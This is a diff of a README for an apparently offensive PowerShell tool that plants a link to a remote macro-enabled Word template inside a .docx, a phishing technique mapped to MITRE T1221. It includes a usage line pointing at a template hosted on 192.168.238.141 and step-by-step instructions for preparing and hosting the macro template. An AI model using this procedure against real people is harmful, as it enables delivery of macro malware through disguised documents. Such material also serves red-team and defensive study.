@@ -1,13 +1,10 @@
-## Template Injection
+# Template InjectionInjects Microsoft template with macro into a Microsoft Word document.  
 
-Injects Microsoft template with macro into a Microsoft Word document.  
+## Requirements
+- PowerShell version 5 or greater.
 
-### Requirements
-
-PowerShell version 5 or greater.
-
-### Usage
-
+## Usage
+```
 usage: .\TemplateInjection.ps1 DOCX URL
 
 positional arguments:
@@ -18,8 +15,9 @@ Example of use
 To inject remote http url:
 
 .\TemplateInjection.ps1 C:\dump\report.docx http:\\192.168.238.141\template.dot
+```
 
-### Basic steps
+## Basic steps
 
 1. Create a Microsoft Word template with macro, and save as a .dotm file (Word Macro-Enabled Template (*.dotm)
 2. Rename above to extension .dot (Word 97-2003 Template).
@@ -27,14 +25,9 @@ To inject remote http url:
 4. Move the .dot file to a remote web server.
 5. Use the PowerShell script to inject reference of the remote template location into the .docx file.
 
-### References
+## References
 
 - Mitre Attack: Template Injection https://attack.mitre.org/techniques/T1221/
 - Phishing with MS Office: Inject Macros from a remote dotm template. https://www.ired.team/offensive-security/initial-access/phishing-with-ms-office/inject-macros-from-a-remote-dotm-template-docx-with-macros
 - RemoteInjector: Python script to Inject remote template link into word document. https://github.com/JohnWoodman/remoteinjector
 - Microsoft: Internet Macros Blocked. https://learn.microsoft.com/en-us/deployoffice/security/internet-macros-blocked
-
-
-
-
-
